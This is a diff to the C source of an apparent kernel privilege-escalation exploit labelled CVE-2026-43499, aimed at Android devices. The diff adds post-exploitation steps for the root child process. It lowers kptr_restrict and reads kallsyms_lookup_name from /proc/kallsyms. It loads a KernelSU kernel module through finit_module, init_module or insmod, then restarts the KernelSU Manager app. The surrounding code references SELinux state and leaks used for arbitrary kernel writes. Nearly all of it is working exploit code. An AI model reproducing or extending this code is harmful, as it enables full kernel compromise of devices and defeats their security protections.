@@ -591,10 +591,175 @@ static int write_value(uint64_t target, uint64_t value) {
   return trigger_pi() == 0;
 }
 
+/* ---------- KernelSU 集成：模块加载 + Manager 重启 ---------- */
+
+static char g_module_path[256] = "/data/local/tmp/kernelsu.ko";
+static int g_leak_only;
+
+static int ksu_read_text(const char *path, char *buf, size_t cap) {
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) return -1;
+  ssize_t n = read(fd, buf, cap - 1);
+  close(fd);
+  if (n < 0) return -1;
+  buf[n] = 0;
+  return (int)n;
+}
+
+static int ksu_module_loaded(void) {
+  static char mods[65536];
+  if (ksu_read_text("/proc/modules", mods, sizeof(mods)) <= 0) return 0;
+  return strstr(mods, "kernelsu") != NULL;
+}
+
+static void ksu_set_kptr(int v) {
+  int f = open("/proc/sys/kernel/kptr_restrict", O_WRONLY | O_CLOEXEC);
+  if (f < 0) return;
+  char c = (char)('0' + v);
+  (void)write(f, &c, 1);
+  close(f);
+}
+
+/* kptr_restrict=1：普通用户读不到 kallsyms，root(CAP_SYSLOG) 可以；
+ * 若仍读不到地址则临时降为 0 重试，最后恢复为 1。 */
+static unsigned long ksu_resolve_kln(void) {
+  static char syms[1 << 20];
+  ksu_set_kptr(1);
+  for (int round = 0; round < 2; round++) {
+    if (ksu_read_text("/proc/kallsyms", syms, sizeof(syms)) > 0) {
+      char *p = strstr(syms, "kallsyms_lookup_name");
+      while (p) {
+        if ((p == syms || p[-1] == ' ') &&
+            (p[20] == '\n' || p[20] == '\0')) break;
+        p = strstr(p + 1, "kallsyms_lookup_name");
+      }
+      if (p) {
+        char *q = p;
+        while (q > syms && q[-1] != '\n') q--;
+        unsigned long addr = strtoul(q, NULL, 16);
+        if (addr) return addr;
+      }
+    }
+    ksu_set_kptr(0);
+  }
+  ksu_set_kptr(1);
+  return 0;
+}
+
+static int ksu_insmod(const char *path, const char *params) {
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) return -1;
+
+  long r = syscall(__NR_finit_module, fd, params, 0);
+  if (r == 0) { close(fd); return 0; }
+
+  /* fallback: init_module with an in-memory buffer */
+  off_t sz = lseek(fd, 0, SEEK_END);
+  if (sz > 0 && lseek(fd, 0, SEEK_SET) == 0) {
+    void *buf = malloc((size_t)sz);
+    if (buf) {
+      ssize_t n = read(fd, buf, (size_t)sz);
+      if (n == (ssize_t)sz)
+        r = syscall(__NR_init_module, buf, (unsigned long)sz, params);
+      free(buf);
+    }
+  }
+  close(fd);
+  if (r == 0) return 0;
+  return -1;
+}
+
+static int ksu_insmod_binary(const char *path, const char *params) {
+  pid_t p = fork();
+  if (p == 0) {
+    execl("/system/bin/insmod", "insmod", path, params, (char *)NULL);
+    _exit(127);
+  }
+  if (p < 0) return -1;
+  int st = 0;
+  if (waitpid(p, &st, 0) < 0) return -1;
+  return WIFEXITED(st) ? WEXITSTATUS(st) : -1;
+}
+
+static void ksu_load_module(void) {
+  pr_info("[KSU] resolving kallsyms_lookup_name...\n");
+  unsigned long kln = ksu_resolve_kln();
+  if (!kln) { pr_error("[KSU] kln resolve failed\n"); return; }
+  pr_info("[KSU] kln=0x%016lx\n", kln);
+
+  char params[96];
+  snprintf(params, sizeof(params), "kln=0x%lx level=3", kln);
+
+  int ret = ksu_insmod(g_module_path, params);
+  if (ret != 0) {
+    pr_warning("[KSU] finit_module failed (errno=%d), trying insmod binary\n", errno);
+    ret = ksu_insmod_binary(g_module_path, params);
+  }
+  if (ret == 0) pr_success("[KSU] insmod ret=0\n");
+  else pr_error("[KSU] insmod failed ret=%d module=%s\n", ret, g_module_path);
+}
+
+/* 杀 Manager 再拉起（全自动刷新）。注意：不要加输出重定向，
+ * 让 am 输出走终端，避免节奏过快触发 exploit 遗留 PI 状态的概率性 panic。 */
+static void ksu_restart_manager(void) {
+  pid_t p = fork();
+  if (p == 0) {
+    execl("/system/bin/am", "am", "force-stop", "me.weishu.kernelsu", (char *)NULL);
+    _exit(127);
+  }
+  if (p > 0) { int st; waitpid(p, &st, 0); }
+
+  usleep(100000); /* 0.1s */
+
+  p = fork();
+  if (p == 0) {
+    execl("/system/bin/am", "am", "start", "-n",
+          "me.weishu.kernelsu/.ui.MainActivity", (char *)NULL);
+    _exit(127);
+  }
+  if (p > 0) { int st; waitpid(p, &st, 0); }
+}
+
+static void usage(const char *prog) {
+  fprintf(stderr,
+          "Usage: %s [OPTIONS]\n"
+          "\n"
+          "Options:\n"
+          "  -m, --module PATH   KernelSU module path (default: /data/local/tmp/kernelsu.ko)\n"
+          "  -h, --help          Show this help\n"
+          "\n"
+          "Special:\n"
+          "  --leak-only         Only run the KASLR/leak verification (no writes)\n"
+          "  --leak-y-only       Only verify the Y task leak (no exploitation)\n",
+          prog);
+}
+
 int main(int argc, char **argv) {
   setvbuf(stdout, NULL, _IONBF, 0);
   __orig_stdout = dup(STDOUT_FILENO);
   process_pid = getpid();
+
+  for (int i = 1; i < argc; i++) {
+    if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
+      usage(argv[0]);
+      return 0;
+    } else if (strcmp(argv[i], "-m") == 0 || strcmp(argv[i], "--module") == 0) {
+      if (i + 1 >= argc) {
+        pr_error("missing value for %s\n", argv[i]);
+        usage(argv[0]);
+        return 2;
+      }
+      snprintf(g_module_path, sizeof(g_module_path), "%s", argv[++i]);
+    } else if (strcmp(argv[i], "--leak-only") == 0) {
+      g_leak_only = 1;
+    } else if (strcmp(argv[i], "--leak-y-only") == 0) {
+      y_leak_only = 1;
+    } else {
+      pr_error("unknown option: %s\n", argv[i]);
+      usage(argv[0]);
+      return 2;
+    }
+  }
 
   timer_reset();
   pr_info("CVE-2026-43499 Exploit Engine Initiated\n");
@@ -629,13 +794,12 @@ int main(int argc, char **argv) {
   pr_info("init_task=0x%016llx selinux_st=0x%016llx\n", (unsigned long long)k_init_task, (unsigned long long)k_selinux_state);
   pr_info("write_val=0x%016llx\n", (unsigned long long)k_write_value);
 
-  if (argc == 2 && strcmp(argv[1], "--leak-only") == 0) {
+  if (g_leak_only) {
     pr_success("Leak-only verification passed.\n");
     return 0;
   }
 
   pthread_t tx, ty;
-  y_leak_only = argc == 2 && strcmp(argv[1], "--leak-y-only") == 0;
 
   if (pthread_create(&ty, NULL, thread_y, NULL) != 0) return 2;
   while (!atomic_load_explicit(&y_task_ready, memory_order_acquire)) sched_yield();
@@ -729,13 +893,19 @@ int main(int argc, char **argv) {
     }
     /* -------------------------------------- */
 
-    pr_success("[CHILD] Running root action. Launching shell...\n");
+    pr_success("[CHILD] Running root action. Loading KernelSU...\n");
 
     dup2(__orig_stdout, STDOUT_FILENO);
     dup2(__orig_stdout, STDERR_FILENO);
     signal(SIGHUP, SIG_IGN);
-    execl("/system/bin/sh", "sh", "/data/local/tmp/load_ksu_54.sh", (char *)NULL);
-    _exit(1);
+
+    if (ksu_module_loaded()) {
+      pr_success("[KSU] kernelsu already loaded, nothing to do\n");
+    } else {
+      ksu_load_module();
+      ksu_restart_manager();
+    }
+    _exit(0);
   }
 
   close(task_pipe[1]);
